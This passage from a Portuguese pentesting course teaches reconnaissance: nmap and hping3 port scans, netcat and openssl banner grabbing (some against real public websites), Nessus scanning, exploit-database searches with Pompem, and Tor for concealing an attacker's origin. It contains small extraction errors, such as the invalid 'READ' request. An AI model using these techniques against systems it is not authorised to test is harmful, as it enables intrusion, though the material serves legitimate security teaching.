serviço de comunicação ativo, por exemplo, um servidor web apache na porta 80. 146<br /> <br /> Fonte: Videoaula TDI – Analisar – Ping Pong (Varredura ICMP)<br /> <br /> 2.<br /> <br /> NMAP – Network mapper<br /> <br /> O Nmap, Network Mapper, é um utilitário gratuito e de código aberto para descoberta de rede e auditoria de segurança. Muitos sistemas e administradores de rede também o acham útil para tarefas como inventário de rede, gerenciamento de agendamentos de atualização de serviços e monitoramento do tempo de atividade do host ou do serviço. O nmap usa pacotes IP crus (raw) em novas formas para determinar quais hosts estão disponíveis na rede, quais serviços (nome e versão do aplicativo) esses hosts estão oferecendo, que sistemas operacionais (e versões do SO) eles estão executando, que tipo de filtros de pacotes / firewalls estão em uso, e dezenas de outras características. Ele foi projetado para digitalizar rapidamente grandes redes, mas funciona bem contra hosts únicos. Ele é executado em todos os principais sistemas operacionais de computadores e os pacotes binários oficiais estão disponíveis para Linux, Windows e Mac OS X. Além do clássico executável nmap da linha de comando, o pacote nmap inclui um GUI avançado e visualizador de resultados (Zenmap), uma ferramenta flexível de transferência de dados, redirecionamento e depuração (Ncat), um utilitário para comparar resultados de varredura (Ndiff) e uma ferramenta de geração de pacotes e análise de respostas (Nping). Utilizando o nmap<br /> <br /> 147<br /> <br /> O nmap faz parte da suíte de aplicações do Kali Linux. Abra o terminal e digite o comando nmap e IP da rede alvo a ser analisado: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="21534e4e55614a404d48">[email&#160;protected]</a>:~# nmap 192.168.0.0/24 Starting Nmap 7.40 ( https://nmap.org ) at 2017-05-21 22:10 BST Nmap scan report for 192.168.0.1 Host is up (0.0017s latency). Not shown: 998 closed ports PORT STATE SERVICE 80/tcp open http 2869/tcp open icslap MAC Address: 58:6D:8F:E4:79:F0 (Cisco-Linksys) Nmap scan report for 192.168.0.14 Host is up (0.0010s latency). Not shown: 977 closed ports PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 23/tcp open telnet 25/tcp open smtp 53/tcp open domain 80/tcp open http ... MAC Address: 08:00:27:F2:EB:AE (Oracle VirtualBox virtual NIC) Nmap scan report for 192.168.0.15 Host is up (0.0000050s latency). Not shown: 999 closed ports PORT STATE SERVICE 22/tcp open ssh 148<br /> <br /> Nmap done: 256 IP addresses (3 hosts up) scanned in 3.32 seconds<br /> <br /> Verifique que o nmap apresentou na tela todos os IPs encontrados na rede e o status de cada serviço rodando em suas respectivas portas. Vamos agora analisar uma máquina específica na rede. Abra o terminal e digite: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="3644595942765d575a5f">[email&#160;protected]</a>:~# nmap 192.168.0.14<br /> <br /> Starting Nmap 7.01 ( https://nmap.org ) at 2017-05-14 15:33 BST Nmap scan report for 192.168.0.14 Host is up (0.000016s latency). Not shown: 997 closed ports PORT STATE SERVICE 22/tcp open ssh 139/tcp open netbios-ssn 445/tcp open microsoft-ds Nmap done: 1 IP address (1 host up) scanned in 1.67 seconds<br /> <br /> Por padrão ele faz uma varredura das portas abertas, mostra o número da porta, o tipo de conexão, o estado da porta e qual o serviço que a porta está utilizando. Podemos utilizar a opção -v para verificar de modo verboso, ou seja, mostrando todo o processo que o nmap está realizando, veja o exemplo: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="43312c2c370328222f2a">[email&#160;protected]</a>:~# nmap -v 192.168.0.14<br /> <br /> Starting Nmap 7.40 ( https://nmap.org ) at 2017-05-15 03:17 BST Initiating ARP Ping Scan at 03:17 Scanning 192.168.0.14 [1 port] Completed ARP Ping Scan at 03:17, 0.03s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 03:17 Completed Parallel DNS resolution of 1 host. at 03:17, 0.02s elapsed<br /> <br /> 149<br /> <br /> Initiating SYN Stealth Scan at 03:17 Scanning 192.168.0.14 [1000 ports] Discovered open port 445/tcp on 192.168.0.14 Discovered open port 139/tcp on 192.168.0.14 Discovered open port 22/tcp on 192.168.0.14 Completed SYN Stealth Scan at 03:17, 0.06s elapsed (1000 total ports) Nmap scan report for 192.168.0.14 Host is up (0.000060s latency). Not shown: 997 closed ports PORT STATE SERVICE 22/tcp open ssh 139/tcp open netbios-ssn 445/tcp open microsoft-ds MAC Address: 6C:88:14:0C:5A:88 (Intel Corporate) Read data ﬁles from: /usr/bin/../share/nmap Nmap done: 1 IP address (1 host up) scanned in 0.23 seconds Raw packets sent: 1001 (44.028KB) | Rcvd: 1003 (40.144KB)<br /> <br /> Observe que neste modo as flags de conexão TCP aparecem. Utilizando a opção -sV é possível verificar informações de versões dos serviços que estão rodando nas respectivas portas: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="b5c7dadac1f5ded4d9dc">[email&#160;protected]</a>:~# nmap -sV 192.168.0.14<br /> <br /> Starting Nmap 7.40 ( https://nmap.org ) at 2017-05-15 03:19 BST Nmap scan report for 192.168.0.14 Host is up (0.000053s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) MAC Address: 6C:88:14:0C:5A:88 (Intel Corporate)<br /> <br /> 150<br /> <br /> Service Info: Host: NABUC2; OS: Linux; CPE: cpe:/ o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 11.73 seconds<br /> <br /> Podemos combinar as opções para realizar buscas mais avançadas. <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="f1839e9e85b19a909d98">[email&#160;protected]</a>:~# nmap -sV -O 192.168.0.14<br /> <br /> Starting Nmap 7.40 ( https://nmap.org ) at 2017-05-15 03:25 BST Nmap scan report for 192.168.0.14 Host is up (0.00018s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0) 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) MAC Address: 6C:88:14:0C:5A:88 (Intel Corporate) Device type: general purpose Running: Linux 3.X|4.X OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4 OS details: Linux 3.2 - 4.6 Network Distance: 1 hop Service Info: Host: NABUC2; OS: Linux; CPE: cpe:/ o:linux:linux_kernel OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 13.19 seconds<br /> <br /> -sV: sonda informações nas portas abertas para determinar o serviço/versão. -O: Identifica o sistema operacional de um alvo. 151<br /> <br /> Esta opção apresenta informações do sistema operacional e versões dos serviços que estão sendo executados. Podemos realizar um scan com a flag FYN, com a opção -sF para que o scan envie uma flag para finalizar a sessão com cada porta encontrada, sendo assim, ele retorna o estado com detalhes de cada porta.<br /> <br /> <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="d5a7babaa195beb4b9bc">[email&#160;protected]</a>:~# nmap -sF 192.168.0.14 Starting Nmap 7.40 ( https://nmap.org ) at 2017-05-15 18:32 BST Nmap scan report for 192.168.0.24 Host is up (0.00014s latency). Not shown: 977 closed ports PORT STATE SERVICE 21/tcp open|filtered ftp 22/tcp open|filtered ssh 23/tcp open|filtered telnet 25/tcp open|filtered smtp 53/tcp open|filtered domain 80/tcp open|filtered http ... MAC Address: 08:00:27:CC:74:71 (Oracle VirtualBox virtual NIC) Nmap done: 1 IP address (1 host up) scanned in 1.42 seconds O NMAP é uma ferramenta extremamente poderosa, pois com ele é possível extrair muitas informações para uma exploração e um possível ataque.<br /> <br /> 152<br /> <br /> Porém, esta ferramenta gera muitos logs no servidor alvo. Veja uma análise de log, da máquina alvo, com o TCPdump após realizar o scan acima. <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="80f2efeff4c0ede5f4e1f3f0ecefe9f4e1e2ece5">[email&#160;protected]</a>:/home/msfadmin# tcpdump -i eth0 src 192.168.0.23 -n tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on eth0, link-type EN10MB (Ethernet), capture size 96 bytes 13:47:15.337212 arp who-has 192.168.0.24 tell 192.168.0.23 13:47:15.421400 IP 192.168.0.23.52120 > 192.168.0.24.23: F 3840265054:3840265054(0) win 1024 13:47:15.421421 IP 192.168.0.23.52120 > 192.168.0.24.113: F 3840265054:3840265054(0) win 1024 13:47:15.421470 IP 192.168.0.23.52120 > 192.168.0.24.143: F 3840265054:3840265054(0) win 1024 … tcpdump: executa a aplicação TCPdump. -i eth0: -i define a interface a ser monitorado, neste caso eth0. src 192.168.0.23: src define a fonte que será analisada, no caso o IP do atacante 192.168.0.23. -n: Apresenta o resultado na tela sem a resolução de nome do atacante. São inúmeras as linhas de logs registrados no servidor a l v o, a p e s a r d e s e r a l g o q u e e s t á e x p o s t o publicamente, não estamos infringindo nenhuma lei, o atacante pode ser descoberto, caso esteja utilizando uma rede pessoal que não esteja passando por proxys e vpns. ~#[Pensando_fora.da.caixa] 153<br /> <br /> (01) Através das versões encontradas com o nmap é possível encontrar exploits para realizar invasões em sistema. (02) Podemos utilizar algumas ferramentas online que realizam scanners remotamente, por meio de sites que realizam este serviço: http://mxtoolbox.com/PortScan.aspx https://incloak.com/ports/ https://hackertarget.com/nmap-online-portscanner/<br /> <br /> Observações: (01) A utilização do nmap faz bastante “barulho” na rede, para realizar scanners na internet afins de cometer comprometer sistemas, criminosos realizam scanners através de navegações privadas para não serem encontrados facilmente. (02) Alguns servidores podem não mostrar informações de versões de serviços e sistemas operacionais, pois o responsável por esse sistema realizou algumas configurações de segurança. Fonte: Videoaula TDI – Analisar – NMAP (Network Mapper)<br /> <br /> 3.<br /> <br /> Encontrando portas - HPING3<br /> <br /> O hping3 é uma ferramenta que auxilia no teste de conexões em portas. Através dele é possível utilizar opções de flags do pacote TCP e descobrir qual o real estado da porta, por exemplo, a porta pode estar sendo rejeitada/bloqueada pelo firewall. 154<br /> <br /> 5.3.1. Utilizando o hping3 O hping3 faz parte da suíte de programas do Kali Linux. Para utilizá-lo abra o terminal e passe os parâmetros específicos. Veja algumas opções das Flags que podem ser utilizadas: SYN SYN-ACK ACK FIN RST<br /> <br /> – – – – –<br /> <br /> synchronize Pacote de resposta Acknowledgement Finalise Reset<br /> <br /> SA RA<br /> <br /> – –<br /> <br /> SYN/ACK RST/ACK<br /> <br /> Análise com o hping3 na porta 80 em um alvo sem regras iptables aplicada: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="1d6f7272695d767c7174">[email&#160;protected]</a>:~# hping3 --syn -c 1 -p 80 192.168.0.24 HPING 192.168.0.24 (eth0 192.168.0.24): S set, 40 headers + 0 data bytes len=46 ip=192.168.0.24 ttl=64 DF id=0 sport=80 flags=SA seq=0 win=5840 rtt=7.9 ms --- 192.168.0.24 hping statistic --1 packets transmitted, 1 packets received, 0% packet loss round-trip min/avg/max = 7.9/7.9/7.9 ms hping3 : executa a aplicação hping3. --syn: envia um pacote SYN (syncronize). -c 1: -c define a quantidade de pacotes a ser enviados, neste caso apenas 1. -p 80: -p define a porta a ser analisada, neste caso a porta 80 192.168.0.24: IP do servidor alvo. 155<br /> <br /> Verifique que ele retorna algumas informações importantes, veja que a informação retornada no campo flag= é uma resposta SA. Essa flag significa que houve uma resposta do servidor e essa porta está aberta. Análise com o hping3 na porta 80 em um alvo com regras iptables aplicada, rejeitando pacotes (REJECT). Regra iptables aplicada: iptables -A INPUT -p tcp --dport 80 -j REJECT Análise com o hping3: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="b5c7dadac1f5ded4d9dc">[email&#160;protected]</a>:~# hping3 --syn -c 1 -p 80 192.168.0.24 HPING 192.168.0.24 (eth0 192.168.0.24): S set, 40 headers + 0 data bytes ICMP Port Unreachable from ip=192.168.0.24 name=UNKNOWN --- 192.168.0.24 hping statistic --1 packets transmitted, 1 packets received, 0% packet loss round-trip min/avg/max = 0.0/0.0/0.0 ms Veja que recebemos uma resposta dizendo que a porta não está alcançável, pois a regra com a ação REJECT barra o pacote e devolve um erro ao remetente informando que o pacote foi barrado. Análise com o hping3 na porta 80 em um alvo com regras iptables aplicada, barrando os pacotes (DROP). Regra iptables aplicada: iptables -A INPUT -p tcp --dport 80 -j DROP Análise com o hping3: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="2654494952664d474a4f">[email&#160;protected]</a>:~# hping3 --syn -c 1 -p 80 192.168.0.24<br /> <br /> 156<br /> <br /> HPING 192.168.0.24 (eth0 192.168.0.24): S set, 40 headers + 0 data bytes --- 192.168.0.24 hping statistic --1 packets transmitted, 0 packets received, 100% packet loss round-trip min/avg/max = 0.0/0.0/0.0 ms Veja que agora não obtivemos nenhuma resposta, pois a regra com a ação DROP barra o pacote silenciosamente, não retornando nenhuma mensagem. Análise com o hping3 na porta 80 em um alvo com regras iptables aplicada, rejeitando, com opções de parâmetro de reset de pacotes (REJECT --rejectwith tcp-reset). Regra iptables aplicada: iptables -A INPUT -p tcp --dport 80 -j REJECT --reject-with tcp-reset Análise com o hping3: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="34465b5b40745f55585d">[email&#160;protected]</a>:~# hping3 --syn -c 1 -p 80 192.168.0.24 HPING 192.168.0.24 (eth0 192.168.0.24): S set, 40 headers + 0 data bytes len=46 ip=192.168.0.24 ttl=64 DF id=0 sport=80 flags=RA seq=0 win=0 rtt=7.5 ms --- 192.168.0.24 hping statistic --1 packets transmitted, 1 packets received, 0% packet loss round-trip min/avg/max = 7.5/7.5/7.5 ms Verifique que ele retorna uma resposta, rejeitando pacotes. Veja também que a informação retornada no campo flag= é uma resposta RA, essa flag significa 157<br /> <br /> que houve uma resposta do servidor e a porta está fechada. Fonte: Videoaula TDI – Analisar – Encontrando Portas Abertas<br /> <br /> 158<br /> <br /> Chapter 06<br /> <br /> 159<br /> <br /> UNIDADE 06 2. ANÁLISE DE VULNERABILIDADES O processo de identificação de análise de vulnerabilidades consiste desde a navegação no site em buscas de páginas de erros, exploração do código-fonte, até o uso de ferramentas específicas, como o nmap, para vasculhar a rede e obter versões de serviços e sistemas operacionais. O que devemos fazer nesta etapa é abstrair o máximo de informações sobre as versões dos serviços e sistemas de um determinado alvo. Com essas informações iremos pesquisar ou até mesmo criar exploits para, de alguma forma, invadir este sistema. ~#[Pensando_fora.da.caixa] Uma análise de vulnerabilidades não se aplica apenas a sistemas e serviços eletrônicos, ela engloba tudo que possa existir, desde uma simples caneta até pessoas, sendo possível aplicar engenharia social das mais diversas formas. Criminosos fazem da engenharia social uma ferramenta muito poderosa para conseguir o que eles desejam, o que envolve aplicar golpes desde o funcionário de mais baixo cargo em uma empresa até funcionários do alto escalão. Livros para saber mais sobre engenharia social: Social Engineering: The Art of Human Hacking Christopher Hadnagy e Engenharia Social - Ian Mann. Fonte: Videoaula TDI – Análise de Vulnerabilidades - Introdução<br /> <br /> 160<br /> <br /> Banner grabbing O Banner grabbing, ou, em português, captura de banner é uma técnica usada para recolher informações sobre um sistema de computador em uma rede e os serviços em execução em suas portas abertas. Os administradores podem usar isso para fazer um inventário dos sistemas e serviços em sua rede. No entanto, um intruso pode usar banner agarrando, a fim de encontrar hosts de rede que estão executando versões de aplicativos e sistemas operacionais com explorações conhecidas. Alguns exemplos de portas de serviço usadas para captura de banner são aquelas usadas pelo HTTP (Protocolo de Transferência de Texto), Protocolo de Transferência de Arquivos (FTP) e SMTP (Simple Mail Transfer Protocol); Portas 80, 21 e 25, respectivamente. Ferramentas comumente usadas para realizar captura de banner são telnet, que está incluída com a maioria dos sistemas operacionais e Netcat. Fonte: Videoaula TDI – Análise de Vulnerabilidades - Identificando Sistemas e Vulnerabilidades<br /> <br /> 1.<br /> <br /> HTTP Banner grabbing<br /> <br /> Para realizar a captura de banner HTTP iremos utilizar o netcat, uma ferramenta que faz parte da suíte de programas do Kali Linux. Iremos realizar a captura de banner HTTP na porta 80. Abra o terminal e digite: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="7f0d10100b3f141e1316">[email&#160;protected]</a>:~# nc -v guardweb.com.br 80 Warning: inverse host lookup failed for 104.31.87.52: Unknown host 161<br /> <br /> Warning: inverse host lookup failed for 104.31.86.52: Unknown host guardweb.com.br [104.31.87.52] 80 (http) open _ nc : executa a aplicação netcat. -v: Opção para apresentar na tela de modo verboso. guardweb.com.br 80: IP/NOME e porta alvo. Veja que a conexão foi estabelecida e o servidor está aguardando comandos nesse momento. Vamos passar alguns comandos HTTP durante a conexão com o servidor através do nc. ... guardweb.com.br [104.31.87.52] 80 (http) open READ / HTTP/1.0 HTTP/1.1 403 Forbidden Date: Mon, 15 May 2017 19:33:55 GMT Content-Type: text/html; charset=UTF-8 Connection: close Set-Cookie: __cfduid=d0f76f88349cf5594ae9cb1ac36b4c9ef1494876835; expires=Tue, 15-May-18 19:33:55 GMT; path=/; domain=. 21f62; HttpOnly Cache-Control: max-age=15 Expires: Mon, 15 May 2017 19:34:10 GMT X-Frame-Options: SAMEORIGIN Server: cloudflare-nginx CF-RAY: 35f8881c77861395-LHR <br /> <br /> 162<br /> <br /> <br /> <br /> Direct IP access not allowed | Cloudﬂare<br /> <br /> … READ / HTTP/1.0: Este comando realiza a leitura do cabeçalho HTTP do serviço no servidor. Este servidor tem algumas configurações de segurança aplicada, o banner que ele disponibiliza não contém versão do serviço ( HTTP/1.1 403 Forbidden ) utilizando de poucos detalhes sobre a máquina alvo.<br /> <br /> Observação: (01) Para que o comando tenha efeito é necessário pressionar a tecla “Enter” duas vezes. Vamos agora estabelecer a conexão com um servidor vulnerável, o Metasploitable2, para entender melhor alguns comandos que podemos utilizar: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="e0928f8f94a08b818c89">[email&#160;protected]</a>:~# nc -v 192.168.0.24 80 192.168.0.24: inverse host lookup failed: Unknown host (UNKNOWN) [192.168.0.24] 80 (http) open READ / HTTP/1.0 host:192.168.0.24 HTTP/1.1 200 OK Date: Mon, 15 May 2017 22:06:55 GMT Server: Apache/2.2.8 (Ubuntu) DAV/2 X-Powered-By: PHP/5.2.4-2ubuntu5.10 Content-Length: 891<br /> <br /> 163<br /> <br /> Connection: close Content-Type: text/html Metasploitable2 - Linux<br /> <br /> … host:guardweb.com.br: Especifica um determinado host e é utilizado para não ter informações sobre outros servidores na rede. Veja que neste servidor vulnerável, obtivemos dados precisos da versão do serviço do Apache, linguagem que o site está escrito, e todo o código-fonte do conteúdo deste servidor. Podemos utilizar estes comandos para realizar leitura de banner HTTP em outros serviços. Vamos realizar a captura de banner do serviço ssh do Metasploitable2. <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="20524f4f54604b414c49">[email&#160;protected]</a>:~# nc -v 192.168.0.24 80 192.168.0.24: inverse host lookup failed: Unknown host (UNKNOWN) [192.168.0.24] 22 (ssh) open SSH-2.0-OpenSSH_4.7p1 Debian-8ubuntu1 É apresentado um erro, porém ele nos traz o banner do serviço utilizado na porta 22.<br /> <br /> Observação: (02) Raramente iremos encontrar servidores que apresentam versões do serviço no banner, em alguns casos o servidor alvo pode fechar a conexão rapidamente e em outros casos não exibir nenhuma informação no cabeçalho, pois existem tipos de 164<br /> <br /> configurações de segurança e são comumente aplicados, mas com esses testes podemos observar como estas ferramentas operam. Fonte: Videoaula TDI – Análise de Vulnerabilidades – Captura de Banners HTTP<br /> <br /> 2.<br /> <br /> HTTPS Banner grabbing<br /> <br /> Para realizar a captura de banner HTTPS (porta 443) de serviços que utilizam conexões seguras com protocolo SSL, iremos utilizar o openssl, ferramenta que faz parte da suíte de programas do Kali Linux. Iremos realizar a captura de banner HTTPS na porta 443, em um servidor público que tenha esta vulnerabilidade. Abra o terminal e digite: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="d4a6bbbba094bfb5b8bd">[email&#160;protected]</a>:~# openssl s_client -quiet -connect www.checkmarx.com:443 depth=2 C = US, O = GeoTrust Inc., CN = GeoTrust Global CA verify return:1 depth=1 C = US, O = GeoTrust Inc., CN = RapidSSL SHA256 CA verify return:1 depth=0 CN = *.checkmarx.com verify return:1 READ / HTTP/1.0 HTTP/1.1 405 Not Allowed Server: nginx/1.10.0 (Ubuntu) Date: Mon, 15 May 2017 22:31:11 GMT Content-Type: text/html Content-Length: 182 Connection: close<br /> <br /> 165<br /> <br /> 405 Not Allowed<br /> <br /> 405 Not Allowed nginx/1.10.0 (Ubuntu) <br /> <br /> Com este comando obtivemos o banner do serviço da porta 443, neste caso o serviço web nginx com a versão 1.10.0 (Ubuntu).<br /> <br /> Observações:<br /> <br /> (01) Alguns servidores podem fechar sua conexão em segundos, pois foi aplicado algum método de segurança no servidor. (02) Alguns cabeçalhos podem ser criados pelo administrador apenas para confundir uma possível intrusão. Fonte: Videoaula TDI – Análise de Vulnerabilidades – Captura de Banners HTTPS<br /> <br /> 3.<br /> <br /> Scanners de Vulnerabilidades<br /> <br /> O interessante até este ponto é que aprendemos como a etapa de scanners funciona de uma forma crua. É muito importante o seu entendimento a respeito de scanners para você saber tudo que passa por trás de alguns softwares que realizam esses scanners de forma automática, como o que iremos ver a seguir, O Nessus. Fonte: Videoaula TDI – Análise de Vulnerabilidades – Scanners de Vulnerabilidades<br /> <br /> 166<br /> <br /> 3.1.<br /> <br /> Nessus<br /> <br /> O Nessus® é o scanner de vulnerabilidades mais abrangente do mercado atualmente. O Nessus Professional ajudará a automatizar o processo de verificação de vulnerabilidades, economizando tempo em seus ciclos de conformidade e permitindo que você envolva sua equipe de TI. Utilizando o Nessus O Nessus não é uma ferramenta que faz parte da suíte do Kali Linux. Para realizar o download e registro, acesse: http://www.tenable.com/ O Nessus disponibiliza um pacote .dpkg. Para instalar o pacote faça o download do aplicativo, abra o terminal e digite: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="11637e7e65517a707d78">[email&#160;protected]</a>:~# dpkg -i Nessus-6.10.5-debian6_amd64.dpkg Selecting previously unselected package nessus. (Reading database ... 347859 ﬁles and directories currently installed.) Preparing to unpack Nessus-6.10.5-debian6_amd64.deb … Inicie o serviço do Nessus (nessusd) para que possamos utilizá-lo: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="64160b0b10240f05080d">[email&#160;protected]</a>:~# /etc/init.d/nessusd start Starting Nessus : . Para utilizar o Nessus acesse o seu navegador e digite: 167<br /> <br /> https://localhost:8834 Crie um usuário e senha para acesso, entre com sua chave de ativação e ele estará pronto para o uso. Criando um scan 1.<br /> <br /> Para criar um scan, clique no botão do lado superior esquerdo “New Scan”.<br /> <br /> 2.<br /> <br /> Selecione o tipo de scan que você deseja fazer, clique em “Basic Network Scan”.<br /> <br /> 168<br /> <br /> 169<br /> <br /> 3.<br /> <br /> Insira os dados como nome do scan, descrição, a pasta que você deseja salvar o novo scan e entre com os dados do IP/ RANGE IP alvo no campo “Targets” e clique em SAVE.<br /> <br /> Iniciando um scan Para iniciar o scan basta clicar no botão play >.<br /> <br /> 170<br /> <br /> Verificando o Scan Para verificar o scan clique em cima do nome do scan.<br /> <br /> Ele irá apresentar um gráfico detalhado com todas as m á q u i n a s e s c a n e a d a s e a s v u l n e ra b i l i d a d e s encontradas separadas por grau de risco, apresentadas em um gráfico de porcentagem.<br /> <br /> Para verificar os detalhes das vulnerabilidades, clique na aba “Vulnerabilities”. 171<br /> <br /> Ele irá apresentar uma lista detalhada com o nome dos serviços/plugins/aplicativos e todas as vulnerabilidades encontradas separadas por grau de risco.<br /> <br /> 172<br /> <br /> Também é possível verificar algumas soluções para essas vulnerabilidades. Clique na vulnerabilidade desejada e veja o tópico Solutions.<br /> <br /> Caso você queira fazer o download do relatório, basta clicar no botão superior direito “Export” e selecionar o tipo de arquivo que você deseja PDF, Nessus, CSV, HTML, Nessus DB. Este é apenas um overview dessa ferramenta incrível, mas com isso já é possível realizar todo o trabalho de coleta e análise de vulnerabilidades automaticamente e economizar bastante tempo. Fonte: Videoaula TDI – Análise de Vulnerabilidades – Nessus<br /> <br /> 4.<br /> <br /> Pompem - Exploit and Vulnerability Finder 173<br /> <br /> O Pompem é uma ferramenta de código aberto, projetada para automatizar a busca de Exploits e Vulnerabilidade nas bases de dados mais importantes. Desenvolvido em Python, possui um sistema de busca avançada, que auxilia o trabalho de pentesters e hackers éticos. Na versão atual, ele executa pesquisas no banco de dados em PacketStorm, CXSecurity, ZeroDay, Vulners, National Vulnerability Database, WPScan Vulnerability Database. Instalando o Pompem O Pompem não faz parte da suíte de ferramentas do Kali Linux. Para realizar o download acesse: https://github.com/rfunix/Pompem Também é possível realizar o download direto do repositório Git Repository: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="50223f3f24103b313c39">[email&#160;protected]</a>:~# git clone https://github.com/rfunix/ Pompem.git Utilizando o Pompem Para utilizá-lo, acesse a pasta Pompem que foi baixada. <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="32405d5d467259535e5b">[email&#160;protected]</a>:~# cd Pompem/ <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="d9abb6b6ad99b2b8b5b0">[email&#160;protected]</a>:~/Pompem# ls common core pompem.1 pompem.py README.markdown requirements.txt 174<br /> <br /> A aplicação foi desenvolvida em Python, então é necessário utilizar o comando python3.5 para utilizar o Pompem. Veja as opções que podemos utilizar com o Pompem como comando: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="15677a7a61557e74797c">[email&#160;protected]</a>:~# python3.5 pompem.py -h Options: -h, --help show this help message and exit -s, --search text for search --txt Write txt File --html Write html File Va m o s r e a l i z a r u m a b u s c a d e e x p l o i t s e vulnerabilidades para os serviços ssh,ftp e mysql: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="41332e2e35012a202d28">[email&#160;protected]</a>:~# python3.5 pompem.py -s ssh,ftp,mysql +Results ssh +-------------------------------------------+ +Date Description Url +-------------------------------------------+ + 2017-04-26 | Mercurial Custom hg-ssh Wrapper Remote Code Execut | https://packetstormsecurity.com/ﬁles/142331/ Mercurial-Custom-hg-ssh-Wrapper-Remote-CodeExecution.html +-------------------------------------------+ ... +Results ftp +-------------------------------------------+ +Date Description Url +-------------------------------------------+ + 2017-05-04 | Hydra Network Logon Cracker 8.5 | https:// packetstormsecurity.com/ﬁles/142388/Hydra-Network-LogonCracker-8.5.html +-------------------------------------------+ ... +Results mysql 175<br /> <br /> +-------------------------------------------+ +Date Description Url +-------------------------------------------+ + 2017-05-04 | Hydra Network Logon Cracker 8.5 | https:// packetstormsecurity.com/ﬁles/142388/Hydra-Network-LogonCracker-8.5.html +-------------------------------------------+ ... O Pompem irá apresentar todos os exploits encontrados sobre os serviços solicitados. Para verificar, clique no link que é apresentado logo após o nome da vulnerabilidade/exploit. A página com a vulnerabilidade respectiva será aberta no navegador e você pode ler sobre ela e, caso necessário, realizar o download. Esta é uma ferramenta perfeita para pesquisar sobre vulnerabilidades de serviços em vários sites de segurança através do terminal. Fonte: https://github.com/rfunix/Pompem<br /> <br /> 176<br /> <br /> Chapter 07<br /> <br /> 177<br /> <br /> 7. PRIVACIDADE<br /> <br /> UNIDADE 07<br /> <br /> Nesta seção iremos aprender sobre anonimato e privacidade, como ocultar um endereço IP na web, rede TOR, VPN, proxy chains, enfim, vamos ocultar a nossa origem online. Iremos entender como um atacante hoje consegue ocultar a origem, não apenas estando em uma wifi aberta, mas realmente ocultando o IP, DNS e tudo que envolva o acesso à rede. 1.<br /> <br /> TOR - The Onion Router<br /> <br /> Tor é um software livre e uma rede aberta que o ajuda a se defender contra a análise de tráfego, uma forma de vigilância de rede que ameaça a liberdade pessoal e privacidade, atividades comerciais confidenciais, relacionamentos e segurança do Estado. Funcionamento da rede TOR Criar recursos anônimos é possível devido à rede de serviços distribuídos chamados “nós”, ou roteadores que operam sob o princípio dos anéis de cebola (daí o seu nome, “O Roteador de Cebola”). Todo o tráfego da rede (ou seja, qualquer informação) é criptografado repetidamente, no entanto passa através de vários nós. Além disso, nenhum nó de rede sabe a fonte do tráfego, o destino ou o conteúdo. Isso garante um alto nível de anonimato.<br /> <br /> 178<br /> <br /> CURIOSIDADES:<br /> <br /> (01) Tor e bitcoin O desenvolvimento de Tor coincidiu com o surgimento da moeda Bitcoin. Uma combinação de dinheiro anônimo em um ambiente anônimo significa que os cibercriminosos podem permanecer praticamente indetectáveis. (02) Malware Os cibercriminosos começaram a usar a Tor para hospedar malware. Os especialistas da Kaspersky descobriram uma variante do Trojan Zeus que usa recursos da Tor, depois outro chamado Chewbacca e o primeiro Trojan Tor para Android. A rede Tor tem muitos recursos dedicados a malwares – servidores C&C (comando & controle), painéis de administração etc.<br /> <br /> 179<br /> <br /> Instalando e configurando o TOR O TOR não faz parte da suíte de ferramentas do Kali Linux. Primeiramente, então, vamos realizar a instalação do serviço TOR. Para isso abra o terminal e digite: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="64160b0b10240f05080d">[email&#160;protected]</a>:~# apt-get install tor<br /> <br /> Observação: (01) O software TOR não pode ser aberto como usuário root, caso necessário crie um usuário sem permissão de usuário. Após instalar o serviço do TOR vamos realizar o download do navegador. Acesse o site: https://www.torproject.org/download/ O pacote disponibilizado está em formato .tar.xz. Para descompactar o pacote, realize os seguintes comandos: <a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="2f5a5c4a5d6f444e4346">[email&#160;protected]</a>:/opt# tar -Jxf 